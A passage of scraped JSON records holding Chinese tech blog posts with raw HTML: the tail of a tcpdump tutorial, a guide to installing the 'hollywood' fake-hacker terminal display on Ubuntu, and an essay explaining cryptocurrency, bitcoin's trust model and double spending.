crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ tcpdump -i eth0 src port not 22</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634b9eedf64745256553-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634b9eedf64745256553-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tcpdump</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">eth0 </span><span class=\"crayon-e\">src </span><span class=\"crayon-e\">port </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>这会捕获 eth0 上除了 22 号端口的所有通讯。</p>\n<p>我们的教程至此就结束了，在本教程中我们讲解了如何安装并使用 <code>tcpdump</code> 来捕获网络数据包。如有任何疑问或建议，欢迎留言。<a href=\"http://jbcdn2.b0.upaiyun.com/2018/01/1d3caa159d6e8c89c120010fd89a25be.png\"><br>\n</a></p>\n<p> </p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113452\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113452votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113452\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/36166d0ecc27103ef7e4ded0df8d95ba560feac4.jpg"}
{"url_object_id": "2f2cb92eda8ea71b6d6fba94287e069b", "title": "在 Linux 的终端上伪造一个好莱坞黑客的屏幕", "url": "http://blog.jobbole.com/113471/", "create_date": "2018/01/12", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2015/10/008d9c47f50ab5eac3f349d238b3b6dc.jpg"], "praise_nums": 2, "comment_nums": 0, "favor_nums": 1, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://itsfoss.com/hollywood-hacker-screen/\">itsfoss</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9228-1.html\">Linux中国</a>   </div><blockquote><p>摘要：这是一个简单的小工具，可以把你的 Linux 终端变为好莱坞风格的黑客入侵的实时画面。</p></blockquote>\n<p>我攻进去了！</p>\n<p>你可能会几乎在所有的好莱坞电影里面会听说过这句话，此时的荧幕正在显示着一个入侵的画面。那可能是一个黑色的终端伴随着 ASCII 码、图标和连续不断变化的十六进制编码以及一个黑客正在击打着键盘，仿佛他/她正在打一段愤怒的论坛回复。</p>\n<p>但是那是好莱坞大片！黑客们想要在几分钟之内破解进入一个网络系统除非他花费了几个月的时间来研究它。不过现在我先把对好莱坞黑客的评论放在一边。</p>\n<p>因为我们将会做相同的事情，我们将会伪装成为一个好莱坞风格的黑客。</p>\n<p>这个小工具运行一个脚本在你的 Linux 终端上，就可以把它变为好莱坞风格的实时入侵终端：</p>\n<p>看到了吗？就像这样，它甚至在后台播放了一个 Mission Impossible 主题的音乐。此外每次运行这个工具，你都可以获得一个全新且随机的入侵的终端。</p>\n<p>让我们看看如何在 30 秒之内成为一个好莱坞黑客。</p>\n<h3 id=\"toc_1\">如何安装 Hollywood 入侵终端在 Linux 之上</h3>\n<p>这个工具非常适合叫做 Hollywood 。从根本上说，它运行在 Byobu ——一个基于文本的窗口管理器，而且它会创建随机数量、随机尺寸的分屏，并在每个里面运行一个混乱的文字应用。</p>\n<p><a href=\"http://byobu.co/\">Byobu</a> 是一个在 Ubuntu 上由 Dustin Kirkland 开发的有趣工具。在其他文章之中还有更多关于它的有趣之处，让我们先专注于安装这个工具。</p>\n<p>Ubuntu 用户可以使用简单的命令安装 Hollywood：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359eda3f1d439151962\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo apt install hollywood</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359eda3f1d439151962-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359eda3f1d439151962-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">apt </span><span class=\"crayon-e\">install </span><span class=\"crayon-v\">hollywood</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>如果上面的命令不能在你的 Ubuntu 或其他例如 Linux Mint、elementary OS、Zorin OS、Linux Lite 等等基于 Ubuntu 的 Linux 发行版上运行，你可以使用下面的 PPA 来安装：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359eda3f28237293918\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo apt-add-repository ppa:hollywood/ppa\r\nsudo apt-get update\r\nsudo apt-get install byobu hollywood</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359eda3f28237293918-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359eda3f28237293918-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6359eda3f28237293918-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359eda3f28237293918-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">add</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">repository </span><span class=\"crayon-v\">ppa</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">hollywood</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">ppa</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359eda3f28237293918-2\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">get </span><span class=\"crayon-e\">update</span></div><div class=\"crayon-line\" id=\"crayon-5a6359eda3f28237293918-3\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">get </span><span class=\"crayon-e\">install </span><span class=\"crayon-e\">byobu </span><span class=\"crayon-v\">hollywood</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>你也可以在它的 GitHub 仓库之中获得其源代码： <a href=\"https://github.com/dustinkirkland/hollywood\">Hollywood 在 GitHub</a> 。</p>\n<p>一旦安装好，你可以使用下面的命令运行它，不需要使用 sudo ：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359eda3f2c531540514\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nhollywood</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359eda3f2c531540514-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359eda3f2c531540514-1\"><span class=\"crayon-v\">hollywood</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>因为它会先运行 Byosu ，你将不得不使用 <code>Ctrl+C</code> 两次并再使用 <code>exit</code> 命令来停止显示入侵终端的脚本。</p>\n<p>这里面有一个伪装好莱坞入侵的视频。</p>\n<p><video controls=\"controls\" width=\"640\" height=\"360\"></video></p>\n<p>这是一个让你朋友、家人和同事感到吃惊的有趣小工具，甚至你可以在酒吧里给女孩们留下深刻的印象，尽管我不认为这对你在那方面有任何的帮助，</p>\n<p>并且如果你喜欢 Hollywood 入侵终端，或许你也会喜欢另一个可以<a href=\"https://itsfoss.com/sneakers-movie-effect-linux/\">让 Linux 终端产生 Sneaker 电影效果的工具</a>。</p>\n<p>如果你知道更多有趣的工具，可以在下面的评论栏里分享给我们。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113471\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113471votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113471\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/80b4614d2c41c6d4f76f79bebe8e4d4beca33f43.jpg"}
{"url_object_id": "34d6afcd431ba0245ad71a58bd857c6e", "title": "加密货币的本质", "url": "http://blog.jobbole.com/113463/", "create_date": "2018/01/11", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/bef7a3f8ed2559670abdc6661cf18f97.jpg"], "praise_nums": 1, "comment_nums": 0, "favor_nums": 1, "tags": "IT技术,加密货币,比特币", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.ruanyifeng.com/blog/2018/01/cryptocurrency-tutorial.html\">阮一峰</a>   </div><p>去年，比特币暴涨，其他币也像雨后春笋一样冒出来，已经有1000多种了。</p>\n<p>很多人都在问，加密货币（cryptocurrency）的时代，真的来临了吗？将来会不会人类不再使用美元、人民币，改用加密货币？那么多品种，我应该使用哪一种币？要不要现在就去投资一些？</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/bef7a3f8ed2559670abdc6661cf18f97.jpg\" alt=\"\"></p>\n<p>这些问题的答案，我也想知道，就花了很多时间查阅资料、研究协议。前两周发表的《<a href=\"http://blog.jobbole.com/113428/\" target=\"_blank\">区块链入门教程</a>》和《<a href=\"http://blog.jobbole.com/113429/\" target=\"_blank\">比特币入门教程</a>》，是我的学习心得。但是，那两篇教程主要介绍基本概念、探讨协议的可行性，没回答一个根本的问题：加密货币到底是什么？</p>\n<p>下面就是我对这个问题的思考。阅读之前，如果你已经了解区块链和比特币，那很好；如果不了解，也没关系，本文不涉及技术，只讨论最基本的原理。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/fd3ad3b10d7062c58d25e1ac53b7bdab.jpg\" alt=\"\"></p>\n<h2>一、钱是什么？</h2>\n<p>我们都知道，人民币是钱，美元是钱，金银财宝是钱。我问一个问题，它们为什么能成为钱？</p>\n<p>你可能回答，因为它们有价值，或者是价值的代表。但是，有价值的东西多了，为什么只有这些品种成为了钱？</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/52ba95f9ee0be605e00dc85475d14fc4.jpg\" alt=\"\"></p>\n<p>答案很容易想到，因为人们普遍相信（认同）它们的价值，其他东西的价值难以得到普通认同，无法成为钱。比如，邮票的价值就没有普遍的认同，除了集邮爱好者，其他地方都不能当钱用。一般来说，认同的人越多，这种钱的通用性就越高。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/c40d04cc878a3cc4e12d2325218af122.jpg\" alt=\"\"></p>\n<p>我曾经去俄罗斯旅行，当地货币是卢布。可是，一旦离开俄国，没人相信它的购买力，所以卢布离开俄国就没用了。相反，全世界人民都相信美元的价值，所以全世界都能用。我用美元付账的时候，我发现那些俄国人都很满意。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/8b875c22fba551f03d909426f641e8c1.jpg\" alt=\"\"></p>\n<p>所以，<strong>钱的本质，或者说货币的本质，就是它的可信性。</strong>它必须使人们相信，它是有价值的，然后才能成为钱，才能被收藏和支付。</p>\n<h2>二、可信性</h2>\n<p>为什么钱必须是可信的？因为对方必须相信它的价值，否则你没法支付出去。那么，接下来的问题就是，可信的东西是否就是钱？</p>\n<p>我的回答是 Yes。<strong>一样东西能否成为钱，只取决于人们是否相信它的价值，至于它是不是真的有价值，根本不重要。</strong></p>\n<p>如果马云在一张纸条上写”这张纸条价值10000元”，下面签了他的名，并且附上防伪标记。你说这纸条是钱吗？我跟你保证，这就是钱，你用来支付，人们都会接受，马云等同于发行了一种新的纸币。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/f3bf0fd699f782c72c3e852c061437c8.jpg\" alt=\"\"></p>\n<p>比特币也是如此，它是什么，其实不太重要。重要的是，它必须保证自己是可信的，这样才能让足够的人相信它的价值，然后才能成为钱。</p>\n<h2>三、比特币的可信性</h2>\n<p><strong>比特币要解决的核心问题，就是创造一种可信的数字凭证。</strong>由于这种凭证可信，所以能够当做货币。</p>\n<p>比特币的技术基础是加密学，因为只有加密学才能保证它的可信性。一旦加密被破解，它就没法当作货币了。这也是这一类数字凭证被称为”加密货币”的原因。</p>\n<p>技术人员对比特币感兴趣，还有一个重要原因。任何需要可靠的数字凭证的场合，也许都可以用到这种技术。</p>\n<h2>四、比特币的特点</h2>\n<p>比特币有三个特点，就是因为做到了这三点，所以它可信，能够当作钱。</p>\n<p><strong>首先，它不会被（轻易）偷走。</strong>或者反过来说，它使得你无法去偷别人，你只能花你自己的钱。因为必须要有别人的私钥，才能取出他的钱。正常情况下，你拿不到别人的私钥。</p>\n<p><strong>其次，它无法伪造。</strong>每一个比特币都能追溯来源，而所有比特币都来源于矿工获得的奖励。矿工只有新建区块，才能获得奖励，这是很难的事情，所以无法伪造比特币。</p>\n<p><strong>最后，它无法大批生成。</strong>原因跟上一条一样，比特币的发行速度是稳定的，现在每10分钟新增12.5个，然后每四年减半，最终停止增长。因此不会像纸币那样，政府滥发导致通货膨胀。</p>\n<h2>五、比特币有实体吗？</h2>\n<p>由于后面要提到的原因，比特币不可能拥有实体，没法做到”从口袋里掏出一个币”这种场景，交易都必须通过互联网完成。</p>\n<p>你可能会说，钱都有实体，怎么可能存在无形的钱呢？答案正好相反，<strong>钱就应该是无形的，那些实体的钱其实是对物质材料的浪费，由于技术不够发达，不得不做成实体。</strong></p>\n<p>我小时候买东西，都必须用现金，否则没法证明，自己拥有购买力。只有通过实体的钱，才能保证对方确实收到了钱。如果银行业发达，就不用现金了，可以使用信用卡。支付的时候，对方抄一下信用卡号码，查询银行”这个账户有钱吗”。银行回答有钱，OK，成交。</p>\n<p>但是，互联网使得实体的信用卡也不需要了。如果存在一个开放的中央记账系统，任何人都可以查询，你把钱划到老板的账户，老板查询一下，发现收到了，交易自动成交，整个过程都是无形的，还需要什么信用卡呢？</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/2d3dcf8c2a61aab348b0f3bc437ce5ee.jpg\" alt=\"\"></p>\n<p>这个中央记账系统已经实现了，就叫做区块链。</p>\n<h2>六、区块链的作用</h2>\n<p><strong>区块链就是一个数据库，记载了所有的交易，用作中央记账系统。</strong></p>\n<p><strong>每笔交易的核心，就是一句话，比如”张三向李四转移了1个比特币”。</strong>为了证明这句话可信，张三为它加上了数字签名。任何人都可以用张三的公钥，证明这确实是张三本人的行为。另一方面，其他人无法伪造张三的数字签名，所以不可能伪造这笔交易。</p>\n<p>矿工们收到这句话，首先验证数字签名的可信性，然后验证张三确实拥有这些比特币（每一笔交易都有上一笔交易的编号，用来查询比特币的来源）。验证通过以后，就着手把这句话写入区块链了。一旦写入区块链，所有人就都可以查询到，因此这笔比特币就被认为，从张三转移到了李四。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/a68850fbc6e8dcaf9efaee6e1e074dc0.png\" alt=\"\"></p>\n<p><strong>区块链的作用就是把这句话永久保存下来了，让任何人都可以查看，并且任何人（包括张三本人在内）都无法再修改了。</strong></p>\n<p><strong>货币是什么？其实就是这句话。这一句话就完成了一次支付。</strong>我们平时用人民币支付，其实只是用纸币表达这条信息。如果每个人都可以实时写入/读取中央记账系统（区块链），那么完全可以不携带货币。</p>\n<h2>七、双重支出</h2>\n<p>前面说过，交易不可能被伪造。但是，由于每一笔交易都是一串二进制信号，因此可能被复制。举例来说，”张三向李四转移了1个比特币”这句话，可能被其他人复制，也可能被张三自己复制，提交到区块链。</p>\n<p><strong>如果这句话被两次写入区块链，就意味着张三可以把同一笔钱花掉两次。</strong>但是，第二次写入的时候，查询区块链可以发现张三已经把这笔钱花掉了，从而认定这是不合法的交易，不能写入区块链。因此，复制交易是不可能的。</p>\n<p><strong>比较麻烦的是另一种情况，就是张三把同一笔钱付给两个人。</strong>他先向区块链提交一个交易”张三向李四转移了1个比特币”，然后又提交了另一个交易”张三向王五转移了1个比特币”。这两个交易都可能被认为是真实的交易，从而进入区块链。因此，必须有办法防止出现这种情况。</p>\n<p>情况一：同一个矿工收到了这两个交易。那么他会察觉到，它们不可能同时成立，因此选择其中的一笔写入区块链。</p>\n<p>情况二：矿工 A 收到了第一笔交易，矿工 B 收到了第二笔交易，他们各自都会认定这是合法的交易，分别把这两笔交易写入了两个区块，这时区块链就出现了分叉。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/9656f03454ce9623e4d533498029a21d.png\" alt=\"\"></p>\n<p>比特币协议规定，分叉点之后最先达到6个区块的那个分支，被认定为正式的区块链，其他分支都将被放弃。由于区块的生成速度由计算能力决定，所以到底哪一笔交易最后会被写入区块链，完全由它所在的分支能吸引多少计算能力决定。<strong>隐藏的逻辑是，如果大多数人（计算能力）选择相信某一笔交易，那么它就应该是真的。</strong></p>\n<p>综上所述，双重支出不可能发生。因为中央记账系统总有办法发现，你把同一笔钱花了两遍。但是，这也说明了比特币的一个代价，就是交易不能实时确认，必须等待至少一个小时。</p>\n<p><strong>八、参考链接</strong></p>\n<ul>\n<li><a href=\"http://www.michaelnielsen.org/ddi/how-the-bitcoin-protocol-actually-works/\">How the Bitcoin protocol actually works</a>, by Michael Nielsen</li>\n</ul>\n<p>（完）</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113463\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113463votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113463\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/0736ffd1b456491f58808486bda5cb84bdaac7e8.jpg"}
